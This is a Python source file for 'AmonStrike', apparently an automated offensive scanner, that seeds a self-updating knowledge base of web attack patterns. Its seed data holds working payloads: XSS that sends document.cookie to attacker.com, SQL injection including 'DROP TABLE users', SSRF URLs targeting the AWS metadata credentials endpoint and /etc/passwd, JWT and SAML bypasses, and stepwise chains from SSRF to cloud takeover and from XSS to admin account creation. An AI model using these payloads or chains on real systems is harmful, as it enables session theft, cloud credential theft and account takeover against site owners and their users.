#!/usr/bin/env python3
"""
AmonStrike — Neural Knowledge Base
Ingests PDFs, books, disclosed H1 reports, CVEs into structured
attack patterns. Self-improving: learns from every scan result.
"""

import os, json, re, hashlib, time
from pathlib import Path
from datetime import datetime

KB_PATH  = Path("data/neural_kb.json")
LOG_PATH = Path("data/learning_log.json")

# ── Attack pattern schema ────────────────────────────────────
# Each pattern the system learns:
# {
#   "id": str,
#   "vuln_class": str,          # idor, xss, sqli, ssrf, rce, logic, ...
#   "trigger": str,             # what condition activates this pattern
#   "payload_templates": [...], # generative payload templates
#   "detection_signals": [...], # what response signals confirm it
#   "chain_inputs": [...],      # what other findings enable this
#   "chain_outputs": [...],     # what this finding enables
#   "severity": str,
#   "confidence": float,        # 0-1, updated by RL loop
#   "success_count": int,
#   "fail_count": int,
#   "source": str,              # book/cve/h1_report/self_learned
#   "last_updated": str,
# }

SEED_PATTERNS = [
    # ── IDOR / BOLA ──────────────────────────────────────────
    {
        "id": "idor_numeric_id",
        "vuln_class": "idor",
        "trigger": "numeric id in URL or JSON body (e.g. /api/users/123)",
        "payload_templates": [
            "{base_id + 1}", "{base_id - 1}", "{victim_id}",
            "{base_id * 2}", "0", "null", "-1"
        ],
        "detection_signals": [
            "status 200 with different account data",
            "response body contains email/name not matching token",
            "anon request returns 403 but attacker+1 returns 200"
        ],
        "chain_inputs":  [],
        "chain_outputs": ["account_takeover", "data_exfiltration"],
        "severity": "HIGH",
        "confidence": 0.85,
        "success_count": 0, "fail_count": 0,
        "source": "bug_bounty_playbook_v2",
        "last_updated": datetime.utcnow().isoformat(),
    },
    {
        "id": "idor_uuid_prediction",
        "vuln_class": "idor",
        "trigger": "UUID in path — check if sequential or time-based v1",
        "payload_templates": [
            "enumerate via /api/resource?page=1&limit=100",
            "check uuid v1 timestamp ordering"
        ],
        "detection_signals": [
            "uuid v1 allows timestamp-based enumeration",
            "API leaks other users UUIDs in list endpoints"
        ],
        "chain_inputs":  ["info_disclosure"],
        "chain_outputs": ["data_exfiltration", "account_takeover"],
        "severity": "HIGH",
        "confidence": 0.70,
        "success_count": 0, "fail_count": 0,
        "source": "bug_bounty_playbook_v2",
        "last_updated": datetime.utcnow().isoformat(),
    },

    # ── XSS ──────────────────────────────────────────────────
    {
        "id": "xss_reflected_basic",
        "vuln_class": "xss",
        "trigger": "user input reflected in HTML response",
        "payload_templates": [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "'\"><svg onload=alert(1)>",
            "javascript:alert(1)",
            "<body onload=alert(1)>",
            "{{7*7}}",  # template injection check
        ],
        "detection_signals": [
            "payload echoed unescaped in response body",
            "Content-Type: text/html with unfiltered input"
        ],
        "chain_inputs":  [],
        "chain_outputs": ["session_hijack", "csrf_bypass", "account_takeover"],
        "severity": "MEDIUM",
        "confidence": 0.80,
        "success_count": 0, "fail_count": 0,
        "source": "bug_bounty_playbook_v2",
        "last_updated": datetime.utcnow().isoformat(),
    },
    {
        "id": "xss_stored",
        "vuln_class": "xss",
        "trigger": "user-supplied data stored and rendered for other users",
        "payload_templates": [
            "<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>",
            "<img src=x onerror=\"this.src='https://attacker.com/steal?c='+document.cookie\">",
        ],
        "detection_signals": [
            "payload persists across sessions",
            "other user accounts render attacker payload"
        ],
        "chain_inputs":  [],
        "chain_outputs": ["session_hijack", "admin_takeover", "worm"],
        "severity": "HIGH",
        "confidence": 0.90,
        "success_count": 0, "fail_count": 0,
        "source": "bug_bounty_playbook_v2",
        "last_updated": datetime.utcnow().isoformat(),
    },

    # ── SQLi ─────────────────────────────────────────────────
    {
        "id": "sqli_union_mysql",
        "vuln_class": "sqli",
        "trigger": "numeric/string parameter in GET/POST passed to DB",
        "payload_templates": [
            "' OR 1=1--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' AND SLEEP(5)--",
            "1; DROP TABLE users--",
            "' OR 'a'='a",
        ],
        "detection_signals": [
            "MySQL/SQL error in response",
            "response time > 5s on SLEEP payload",
            "different content length on boolean payloads"
        ],
        "chain_inputs":  [],
        "chain_outputs": ["data_exfiltration", "auth_bypass", "rce"],
        "severity": "CRITICAL",
        "confidence": 0.85,
        "success_count": 0, "fail_count": 0,
        "source": "bug_bounty_playbook_v2",
        "last_updated": datetime.utcnow().isoformat(),
    },

    # ── SSRF ─────────────────────────────────────────────────
    {
        "id": "ssrf_url_param",
        "vuln_class": "ssrf",
        "trigger": "URL parameter fetched server-side (webhook, import, preview)",
        "payload_templates": [
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://localhost/admin",
            "http://0.0.0.0:22",
            "http://internal.corp/api",
            "file:///etc/passwd",
            "dict://localhost:11211/",
        ],
        "detection_signals": [
            "AWS metadata content in response",
            "internal service response leaked",
            "connection refused vs timeout (port probing)"
        ],
        "chain_inputs":  [],
        "chain_outputs": ["cloud_credential_theft", "internal_network_access", "rce"],
        "severity": "CRITICAL",
        "confidence": 0.80,
        "success_count": 0, "fail_count": 0,
        "source": "bug_bounty_playbook_v2",
        "last_updated": datetime.utcnow().isoformat(),
    },

    # ── JWT ──────────────────────────────────────────────────
    {
        "id": "jwt_none_algorithm",
        "vuln_class": "auth_bypass",
        "trigger": "JWT token used for authentication",
        "payload_templates": [
            "set alg=none, remove signature",
            "set alg=HS256, sign with public key (RS→HS confusion)",
            "brute force weak secret: secret/password/123456",
        ],
        "detection_signals": [
            "server accepts modified JWT",
            "role escalation successful",
            "access to admin endpoints"
        ],
        "chain_inputs":  [],
        "chain_outputs": ["privilege_escalation", "account_takeover", "admin_access"],
        "severity": "CRITICAL",
        "confidence": 0.75,
        "success_count": 0, "fail_count": 0,
        "source": "bug_bounty_playbook_v2",
        "last_updated": datetime.utcnow().isoformat(),
    },

    # ── Subdomain Takeover ───────────────────────────────────
    {
        "id": "subdomain_takeover",
        "vuln_class": "takeover",
        "trigger": "CNAME pointing to unclaimed external service",
        "payload_templates": [
            "check CNAME target: GitHub Pages, Heroku, S3, Netlify, Vercel",
            "claim the target resource if available",
        ],
        "detection_signals": [
            "CNAME target returns 404/NoSuchBucket/Repository not found",
            "DNS resolves but HTTP returns unclaimed page"
        ],
        "chain_inputs":  ["recon_subdomains"],
        "chain_outputs": ["phishing", "session_hijack", "xss"],
        "severity": "HIGH",
        "confidence": 0.90,
        "success_count": 0, "fail_count": 0,
        "source": "bug_bounty_playbook_v2",
        "last_updated": datetime.utcnow().isoformat(),
    },

    # ── Business Logic ───────────────────────────────────────
    {
        "id": "business_logic_price_tamper",
        "vuln_class": "business_logic",
        "trigger": "price or quantity sent client-side in request",
        "payload_templates": [
            "set price=0.01",
            "set quantity=-1 (negative quantity = credit)",
            "modify total in POST body",
        ],
        "detection_signals": [
            "order accepted with modified price",
            "negative balance credited",
            "discount applied beyond maximum"
        ],
        "chain_inputs":  [],
        "chain_outputs": ["financial_fraud"],
        "severity": "HIGH",
        "confidence": 0.70,
        "success_count": 0, "fail_count": 0,
        "source": "oscp_methodology",
        "last_updated": datetime.utcnow().isoformat(),
    },

    # ── Race Condition ───────────────────────────────────────
    {
        "id": "race_condition_coupon",
        "vuln_class": "race_condition",
        "trigger": "single-use resource: coupon, vote, withdrawal, OTP",
        "payload_templates": [
            "send 10-50 identical requests simultaneously",
            "use threading/async to parallelize",
        ],
        "detection_signals": [
            "resource consumed more than once",
            "multiple 200 responses on single-use action"
        ],
        "chain_inputs":  [],
        "chain_outputs": ["financial_fraud", "privilege_escalation"],
        "severity": "HIGH",
        "confidence": 0.75,
        "success_count": 0, "fail_count": 0,
        "source": "bug_bounty_playbook_v2",
        "last_updated": datetime.utcnow().isoformat(),
    },

    # ── SAML ─────────────────────────────────────────────────
    {
        "id": "saml_signature_wrapping",
        "vuln_class": "auth_bypass",
        "trigger": "SAML SSO login flow",
        "payload_templates": [
            "XSW Attack 1-8: move signature, inject malicious assertion",
            "XML comment injection in username field",
            "remove XML signature entirely"
        ],
        "detection_signals": [
            "login succeeds as different user",
            "admin access granted via forged assertion"
        ],
        "chain_inputs":  [],
        "chain_outputs": ["account_takeover", "admin_access"],
        "severity": "CRITICAL",
        "confidence": 0.80,
        "success_count": 0, "fail_count": 0,
        "source": "bug_bounty_playbook_v2",
        "last_updated": datetime.utcnow().isoformat(),
    },

    # ── GraphQL ──────────────────────────────────────────────
    {
        "id": "graphql_introspection",
        "vuln_class": "info_disclosure",
        "trigger": "GraphQL endpoint detected",
        "payload_templates": [
            '{"query":"{__schema{types{name fields{name}}}}"}',
            '{"query":"{__type(name:\\"User\\"){fields{name}}}"}',
            "batch query: send 100 queries in one request (DoS/bypass)",
        ],
        "detection_signals": [
            "introspection returns schema",
            "sensitive field names exposed (password, token, secret)"
        ],
        "chain_inputs":  [],
        "chain_outputs": ["idor", "auth_bypass", "data_exfiltration"],
        "severity": "MEDIUM",
        "confidence": 0.85,
        "success_count": 0, "fail_count": 0,
        "source": "bug_bounty_playbook_v2",
        "last_updated": datetime.utcnow().isoformat(),
    },

    # ── Zero-Day Logic Chains ────────────────────────────────
    {
        "id": "chain_idor_to_ato",
        "vuln_class": "zero_day_chain",
        "trigger": "IDOR confirmed → attempt account takeover",
        "payload_templates": [
            "1. IDOR to read victim email",
            "2. trigger password reset for victim email",
            "3. intercept reset token via IDOR on /api/tokens/{victim_id}",
            "4. reset password → full ATO"
        ],
        "detection_signals": [
            "password reset succeeds for victim account",
            "login with new credentials works"
        ],
        "chain_inputs":  ["idor_numeric_id", "idor_uuid_prediction"],
        "chain_outputs": ["account_takeover"],
        "severity": "CRITICAL",
        "confidence": 0.65,
        "success_count": 0, "fail_count": 0,
        "source": "self_learned_chain",
        "last_updated": datetime.utcnow().isoformat(),
    },
    {
        "id": "chain_ssrf_to_rce",
        "vuln_class": "zero_day_chain",
        "trigger": "SSRF to internal metadata → cloud creds → RCE",
        "payload_templates": [
            "1. SSRF → http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "2. extract AWS_ACCESS_KEY_ID + AWS_SECRET_ACCESS_KEY",
            "3. use creds: aws s3 ls / aws lambda list-functions",
            "4. deploy malicious lambda / write to S3 with public-read"
        ],
        "detection_signals": [
            "AWS credentials in SSRF response",
            "Lambda/S3 access confirmed"
        ],
        "chain_inputs":  ["ssrf_url_param"],
        "chain_outputs": ["rce", "cloud_takeover"],
        "severity": "CRITICAL",
        "confidence": 0.70,
        "success_count": 0, "fail_count": 0,
        "source": "self_learned_chain",
        "last_updated": datetime.utcnow().isoformat(),
    },
    {
        "id": "chain_xss_to_csrf_admin",
        "vuln_class": "zero_day_chain",
        "trigger": "Stored XSS in user content rendered to admins",
        "payload_templates": [
            "1. stored XSS payload in profile/comment/ticket",
            "2. admin views → JS runs in admin session",
            "3. JS makes CSRF request to /admin/add-user or /admin/give-role",
            "4. attacker account now admin"
        ],
        "detection_signals": [
            "admin panel accessible after XSS trigger",
            "new admin account created"
        ],
        "chain_inputs":  ["xss_stored"],
        "chain_outputs": ["admin_access", "full_compromise"],
        "severity": "CRITICAL",
        "confidence": 0.72,
        "success_count": 0, "fail_count": 0,
        "source": "self_learned_chain",
        "last_updated": datetime.utcnow().isoformat(),
    },
]


class NeuralKB:
    """
    Self-improving knowledge base.
    Learns from every scan via reinforcement loop.
    """

    def __init__(self):
        self.patterns = {}
        self._load()

    def _load(self):
        if KB_PATH.exists():
            try:
                data = json.loads(KB_PATH.read_text())
                # File may be a list (correct) or a dict (empty init) or empty
                if isinstance(data, list):
                    self.patterns = {p["id"]: p for p in data if isinstance(p, dict) and "id" in p}
                # else: leave self.patterns empty → will seed below
            except Exception:
                pass
        if not self.patterns:
            self._seed()

    def _seed(self):
        for p in SEED_PATTERNS:
            self.patterns[p["id"]] = p
        self._save()
        print(f"[NeuralKB] Seeded {len(self.patterns)} attack patterns")

    def _save(self):
        KB_PATH.parent.mkdir(parents=True, exist_ok=True)
        KB_PATH.write_text(json.dumps(list(self.patterns.values()), indent=2))

    # ── Query interface ───────────────────────────────────────

    def get_patterns_for(self, vuln_class: str) -> list:
        return [p for p in self.patterns.values()
                if p["vuln_class"] == vuln_class]

    def get_chains_from(self, finding_id: str) -> list:
        """Return patterns that are unlocked by this finding."""
        return [p for p in self.patterns.values()
                if finding_id in p.get("chain_inputs", [])
                or any(c in finding_id for c in p.get("chain_inputs", []))]

    def get_top_patterns(self, n=10) -> list:
        """Return highest-confidence patterns."""
        return sorted(
            self.patterns.values(),
            key=lambda p: p["confidence"] * (p["success_count"] + 1),
            reverse=True
        )[:n]

    def search(self, keyword: str) -> list:
        kw = keyword.lower()
        return [p for p in self.patterns.values()
                if kw in p["id"] or kw in p["vuln_class"]
                or kw in p["trigger"].lower()]

    # ── Reinforcement learning loop ───────────────────────────

    def reinforce(self, pattern_id: str, success: bool, notes: str = ""):
        """Called after each scan attempt. Updates confidence."""
        if pattern_id not in self.patterns:
            return
        p = self.patterns[pattern_id]
        if success:
            p["success_count"] += 1
            # Bayesian confidence update
            p["confidence"] = min(0.99,
                p["confidence"] + (1 - p["confidence"]) * 0.1)
        else:
            p["fail_count"] += 1
            p["confidence"] = max(0.01,
                p["confidence"] - p["confidence"] * 0.05)
        p["last_updated"] = datetime.utcnow().isoformat()
        self._save()
        self._log(pattern_id, success, notes)

    def learn_new_pattern(self, pattern: dict):
        """Add a new pattern learned from a successful finding."""
        if "id" not in pattern:
            pattern["id"] = "learned_" + hashlib.md5(
                pattern.get("trigger","").encode()).hexdigest()[:8]
        pattern.setdefault("success_count", 1)
        pattern.setdefault("fail_count", 0)
        pattern.setdefault("confidence", 0.60)
        pattern.setdefault("source", "self_learned")
        pattern.setdefault("last_updated", datetime.utcnow().isoformat())
        self.patterns[pattern["id"]] = pattern
        self._save()
        print(f"[NeuralKB] Learned new pattern: {pattern['id']}")

    def _log(self, pattern_id: str, success: bool, notes: str):
        log = []
        if LOG_PATH.exists():
            try:
                log = json.loads(LOG_PATH.read_text())
            except Exception:
                pass
        log.append({
            "pattern_id": pattern_id,
            "success":    success,
            "notes":      notes,
            "ts":         datetime.utcnow().isoformat(),
        })
        LOG_PATH.write_text(json.dumps(log[-1000:], indent=2))  # keep last 1000

    # ── Stats ─────────────────────────────────────────────────

    def stats(self) -> dict:
        total = len(self.patterns)
        by_class = {}
        for p in self.patterns.values():
            vc = p["vuln_class"]
            by_class[vc] = by_class.get(vc, 0) + 1
        avg_conf = sum(p["confidence"] for p in self.patterns.values()) / max(total, 1)
        return {
            "total_patterns": total,
            "by_class":       by_class,
            "avg_confidence": round(avg_conf, 3),
            "total_successes": sum(p["success_count"] for p in self.patterns.values()),
            "total_failures":  sum(p["fail_count"]    for p in self.patterns.values()),
        }


# ── CLI ───────────────────────────────────────────────────────

if __name__ == "__main__":
    import argparse
    ap = argparse.ArgumentParser()
    ap.add_argument("--stats",   action="store_true")
    ap.add_argument("--search",  default="")
    ap.add_argument("--chains",  default="", help="Show chains from finding id")
    ap.add_argument("--top",     type=int, default=0)
    ap.add_argument("--reinforce", nargs=3, metavar=("ID","SUCCESS","NOTES"),
                    help="Reinforce pattern: id true/false notes")
    args = ap.parse_args()

    kb = NeuralKB()

    if args.stats:
        print(json.dumps(kb.stats(), indent=2))
    elif args.search:
        for p in kb.search(args.search):
            print(f"  [{p['vuln_class']}] {p['id']} — conf:{p['confidence']:.2f}")
    elif args.chains:
        for p in kb.get_chains_from(args.chains):
            print(f"  CHAIN → {p['id']} ({p['severity']})")
    elif args.top:
        for p in kb.get_top_patterns(args.top):
            print(f"  {p['id']:40s} conf:{p['confidence']:.2f} wins:{p['success_count']}")
    elif args.reinforce:
        pid, succ, notes = args.reinforce
        kb.reinforce(pid, succ.lower() == "true", notes)
        print(f"Updated {pid}: confidence={kb.patterns.get(pid,{}).get('confidence',0):.3f}")
    else:
        s = kb.stats()
        print(f"NeuralKB: {s['total_patterns']} patterns | avg confidence: {s['avg_confidence']}")
